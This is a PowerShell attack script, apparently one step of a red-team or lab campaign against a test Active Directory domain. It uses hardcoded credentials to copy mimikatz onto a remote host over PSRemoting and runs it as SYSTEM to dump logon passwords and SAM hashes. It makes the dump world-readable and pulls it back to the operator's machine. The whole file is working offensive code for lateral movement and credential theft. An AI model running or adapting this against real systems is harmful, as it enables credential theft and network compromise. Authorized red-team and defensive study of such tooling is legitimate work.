[CmdletBinding()]
param(
    [Parameter(Mandatory=$false)]
    [string]$Server = "192.168.77.22",
    [Parameter(Mandatory=$false)]
    [string]$Username = "analyst_t1",
    [Parameter(Mandatory=$false)]
    [string]$Password = "T13r_An@lyst!",
    [Parameter(Mandatory=$false)]
    [string]$ToolSource = "C:\Tools\ADTools",
    [Parameter(Mandatory=$false)]
    [string]$RemoteTool = "C:\Windows\Temp\cadre-tools\mimikatz.exe",
    [Parameter(Mandatory=$false)]
    [string]$OutFile = "C:\Windows\Temp\cadre-tools\cadre-mimi.log"
)
$ErrorActionPreference = "Stop"

$securePass = ConvertTo-SecureString $Password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("child.cadre.local\$Username", $securePass)

# Stage mimikatz from ws01 beachhead to mbr01 Users/Public via PSRemoting (MITRE T1570)
$src = Join-Path $ToolSource "mimikatz.exe"
if (-not (Test-Path $src)) { throw "mimikatz.exe not found in $ToolSource" }
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Copy-Item -Path $src -Destination $RemoteTool -ToSession $sess -Force
    Invoke-Command -Session $sess -ScriptBlock { param($p) icacls $p /grant "Everyone:(RX)" | Out-Null } -ArgumentList $RemoteTool
    Write-Output "STAGED: $src -> $RemoteTool"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}

$script = @"
`$gp = '$RemoteTool'
`$out = '$OutFile'
& `$gp privilege::debug sekurlsa::logonpasswords lsadump::sam exit | Out-File -FilePath `$out -Encoding ASCII -Force
icacls `$out /grant "Everyone:(R)" | Out-Null
Write-Output "MIMI_OK: output written to `$out"
"@

& "$PSScriptRoot\campaign-a-t043-system-exec.ps1" -Server $Server -Username $Username -Password $Password -ScriptBlock $script

# Pull output back to ws01 for operator review
$sess = New-PSSession -ComputerName $Server -Credential $cred -Port 5985 -ErrorAction Stop
try {
    Copy-Item -Path $OutFile -Destination "C:\Tools\cadre-attack\T035-mbr01-creds.log" -FromSession $sess -Force
    Write-Output "PULLED: $OutFile -> C:\Tools\cadre-attack\T035-mbr01-creds.log"
} finally {
    Remove-PSSession -Session $sess -ErrorAction SilentlyContinue
}
